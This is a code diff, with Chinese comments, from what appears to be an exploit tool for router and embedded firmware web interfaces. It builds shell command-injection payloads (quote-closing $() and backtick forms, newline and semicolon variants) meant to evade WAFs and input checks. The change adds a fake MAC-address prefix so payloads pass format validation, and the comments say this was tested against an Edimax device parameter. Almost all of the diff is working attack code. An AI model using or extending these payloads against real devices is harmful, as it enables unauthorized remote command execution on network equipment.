@@ -98,7 +98,7 @@ def guard_hints(chain: dict) -> dict:
     }
 
 
-def shell_payloads(cmd: str, hints: dict | None = None) -> list[str]:
+def shell_payloads(cmd: str, hints: dict | None = None, prefix: str = "x") -> list[str]:
     """把一条任意 shell 命令包成几种能突破常见包装的形态。
 
     固件里命令常写成 `sprintf(buf, "echo '%s' > /tmp/x", param)` —— 值被单引号
@@ -111,11 +111,12 @@ def shell_payloads(cmd: str, hints: dict | None = None) -> list[str]:
     `hints`（来自 guard_hints）会把明显无效的形态去掉，并把最可能的排到前面。
     """
     hints = hints or {}
+    p = prefix
     forms = [
-        f"x'$({cmd})'",        # 闭引号 + $()：最不容易被 WAF/校验盯上
-        f"x'`{cmd}`'",         # 闭引号 + 反引号
-        f"x'\n{cmd}\n'",      # 闭引号 + 换行
-        f"x'\n{cmd}\n",       # 有的实现最后没有收尾引号
+        f"{p}'$({cmd})'",      # 闭引号 + $()：最不容易被 WAF/校验盯上
+        f"{p}'`{cmd}`'",       # 闭引号 + 反引号
+        f"{p}'\n{cmd}\n'",    # 闭引号 + 换行
+        f"{p}'\n{cmd}\n",     # 有的实现最后没有收尾引号
         f"{cmd}",              # 无包装
         f";{cmd};",            # 经典（分号会被截断的实现无效）
     ]
@@ -123,8 +124,8 @@ def shell_payloads(cmd: str, hints: dict | None = None) -> list[str]:
         forms = [f for f in forms if not f.startswith(";")]
     if hints.get("single_quoted"):
         # 已经是单引号包装：把闭合类排前面，去掉"无包装"这种低概率项
-        quote_first = [f for f in forms if f.startswith("x'")]
-        rest = [f for f in forms if not f.startswith("x'") and f != cmd]
+        quote_first = [f for f in forms if f.startswith(f"{p}'")]
+        rest = [f for f in forms if not f.startswith(f"{p}'") and f != cmd]
         forms = quote_first + rest
     return forms
 
@@ -197,8 +198,14 @@ def build_requests(chain: dict, endpoint: dict | None = None,
         or (chain.get("page_params") or [""])[0].strip() \
         or guess_param(chain)
     cat = (chain.get("sink_category") or "").lower()
-    values = (shell_payloads(cmd, guard_hints(chain))
-              if (cmd and cat in ("ci", "cmd")) else payloads(cat))
+    if cmd and cat in ("ci", "cmd"):
+        # MAC 类参数通常会先过格式校验：不带 MAC 前缀的载荷直接被拒，
+        # 根本到不了拼接点（实测 Edimax 的 rootAPmac 就是这样）。
+        param_name = (chain.get("source_param") or "").lower()
+        prefix = "00:11:22:33:44:55" if "mac" in param_name else "x"
+        values = shell_payloads(cmd, guard_hints(chain), prefix=prefix)
+    else:
+        values = payloads(cat)
     channel, hdr = channel_of(chain)
     if channel == "header":
         # 头注入：载荷放进 Cookie / Content-Type 这类头里，body 留空
